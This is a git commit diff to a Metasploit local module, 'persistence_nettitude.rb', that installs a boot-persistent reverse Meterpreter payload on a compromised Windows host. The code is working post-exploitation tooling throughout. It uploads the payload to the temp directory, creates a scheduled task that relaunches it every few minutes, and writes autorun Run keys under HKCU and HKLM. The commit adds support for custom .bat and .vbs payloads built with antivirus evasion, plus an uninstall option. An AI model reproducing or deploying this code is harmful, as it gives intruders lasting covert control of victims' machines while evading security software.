1bb04f023f5e1042ba5497b537511d17d065cee0
benpturner <benpturner@yahoo.com>
2015-04-12 22:22:33 +0100

    i

--- persistence_nettitude.rb
+++ persistence_nettitude.rb
@@ -22,114 +22,135 @@ class Metasploit3 < Msf::Exploit::Local
 
   def initialize(info={})
     super( update_info( info,
-      'Name'          => 'Windows Manage Persistent Payload Installer',
+      'Name'          => 'Windows Manage Persistent Payload Installer-BT',
       'Description'   => %q{
-        This Module will create a boot persistent reverse Meterpreter sessions by
+        This Module will create a boot persistent reverse Meterpreter session by
         installing on the target host the payload as a script that will be executed
         at user logon or system startup depending on privilege and selected startup
-        method.
+        method. For best performance, set a EXE::Custom payload of either a .exe or .bat file generated with AV evasion techniques. Additionally set your own payload handler. 
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
         [
+          'Ben Turner',
           'Carlos Perez <carlos_perez[at]darkoperator.com>'
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ],
       'Targets'       => [ [ 'Windows', {} ] ],
       'DefaultTarget' => 0,
-      'DisclosureDate'=> "Oct 19 2011"
+      'DisclosureDate'=> "Mar 19 2015"
     ))
 
     register_options(
       [
         OptInt.new('DELAY', [true, 'Delay in minutes for persistent payload to reconnect.', 2]),
-        OptString.new('NAME', [true, 'Name of the scheduled task.', 'update-svc-msf']),
+        OptString.new('NAME', [true, 'Name of the scheduled task and registry key.', 'update-svc-msf']),
+        OptString.new('CustomExtension', [true, 'The extension of the Custom EXE file, could be a .bat file or .vbs', '.exe']),
+        OptBool.new('UNINSTALL', [false, 'Set this option if the persistence is to be removed.']),
       ], self.class)
   end
 
   # Exploit Method for when exploit command is issued
+  # maybe make this a post module not exploit as only issue exe::custom and not start handler
+
   def exploit
     print_status("Running module against #{sysinfo['Computer']}")
     delay = datastore['DELAY']
     name = datastore['NAME']
+    unin = datastore['UNINSTALL']
+    cusext = datastore['CustomExtension']
     execus = datastore['EXE::Custom'].to_s
     host,port = session.session_host, session.session_port
-    unless execus.empty?
-      exe = get_custom_exe
+
+    # If the uninstall flag is set, remove the persistence
+    if unin == true
+      print_status("Removing scheduled task from #{sysinfo['Computer']}")
+      run_cmd("schtasks /delete /f /tn #{name}")
+      delete_reg("HKCU", name)
+      delete_reg("HKLM", name)
+
     else
-      exe = generate_payload_exe
+      print_status("To remove persistence set UNINSTALL => true")
+      unless execus.empty?
+        exe = get_custom_exe
+      else
+        exe = generate_payload_exe
+      end
+
+      # uploads the payload to the host
+      script_on_target = write_script_to_target(exe, cusext)
+
+      # exit the module because we failed to write the file on the target host.
+      return unless script_on_target
+
+      # install new scheduled tasks (removes any previously installed tasks first) 
+      print_status("Running module against #{sysinfo['Computer']}")
+      run_cmd("schtasks /delete /f /tn #{name}")
+      run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
+
+      # attempts to write the registry values to the system
+      write_to_reg("HKCU", script_on_target, name)
+      write_to_reg("HKLM", script_on_target, name)
     end
-
-    script_on_target = write_script_to_target(exe)
-
-    print_status("Running module against #{sysinfo['Computer']}")
-    run_cmd("schtasks /delete /f /tn #{name}")
-    run_cmd("schtasks /create /sc minute /mo #{delay} /tn #{name} /tr #{script_on_target}")
-
-    write_to_reg("HKCU", script_on_target, "update-svc")
-    write_to_reg("HKLM", script_on_target, "update-svc")
-
-    # exit the module because we failed to write the file on the target host.
-    return unless script_on_target
-
   end
 
+  ##
+  # uploads the payload to the host with the correct extension
+  ##
 
-  # Writes script to target host and returns the pathname of the target file or nil if the
-  # file could not be written.
-  def write_script_to_target(vbs)
+  def write_script_to_target(payloadsource, ext)
     tempdir = datastore['PATH'] || session.sys.config.getenv('TEMP')
-    tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+    tempfile = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ext
 
     begin
-      write_file(tempvbs, vbs)
-      print_good("Persistent Script written to #{tempvbs}")
-      tempvbs = tempvbs.gsub(/\\/, '\\')      # Escape windows pathname separators.
+      write_file(tempfile, payloadsource)
+      print_good("Persistent Script written to #{tempfile}")
+      tempfile = tempfile.gsub(/\\/, '\\')      # Escape windows pathname separators.
     rescue
       print_error("Could not write the payload on the target hosts.")
       # return nil since we could not write the file on the target host.
-      tempvbs = nil
+      tempfile = nil
     end
-    return tempvbs
+    return tempfile
   end
 
-  # Executes script on target and returns true if it was successfully started
-  def target_exec(script_on_target)
-    execsuccess = true
-    print_status("Executing script #{script_on_target}")
-    # error handling for process.execute() can throw a RequestError in send_request.
-    begin
-      unless datastore['EXE::Custom']
-        session.shell_command_token(script_on_target)
-      else
-        session.shell_command_token("cscript \"#{script_on_target}\"")
-      end
-    rescue
-      print_error("Failed to execute payload on target host.")
-      execsuccess = false
-    end
-    return execsuccess
-  end
+  ##
+  # The write registry function
+  ##
 
-  # Installs payload in to the registry HKLM or HKCU
   def write_to_reg(key, script_on_target, registry_value)
-    nam = registry_value || Rex::Text.rand_text_alpha(rand(8)+8)
+    nam = registry_value
     key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-
-    print_status("Installing into autorun as #{key_path}\\#{nam}")
+    print_status("Installing key into autorun: #{key_path}\\#{nam}")
     if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
-      print_good("Installed into autorun as #{key_path}\\#{nam}")
+      print_good("Installed key into autorun: #{key_path}\\#{nam}")
       return true
     else
-      print_error("Failed to make entry in the registry for persistence in #{key_path}\\#{nam}")
+      print_error("Failed to make entry in the registry for persistence: #{key_path}\\#{nam}")
     end
-
     false
   end
 
   ##
-  # The cmd run function
+  # The delete registry function
+  ##
+
+  def delete_reg(key, registry_value)
+    nam = registry_value
+    key_path = "#{key.to_s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    print_status("Removing key from autorun: #{key_path}\\#{nam}")
+    if key && registry_deletekey(key_path, nam)
+      print_good("Removed key from autorun: #{key_path}\\#{nam}")
+      return true
+    else
+      print_error("Failed to remove entry in the registry: #{key_path}\\#{nam}")
+    end
+    false
+  end
+
+  ##
+  # The api shellexecute function
   ##
 
   def run_cmd(cmd)
@@ -143,6 +164,5 @@ class Metasploit3 < Msf::Exploit::Local
     process.close
     return res
   end
-
 
 end
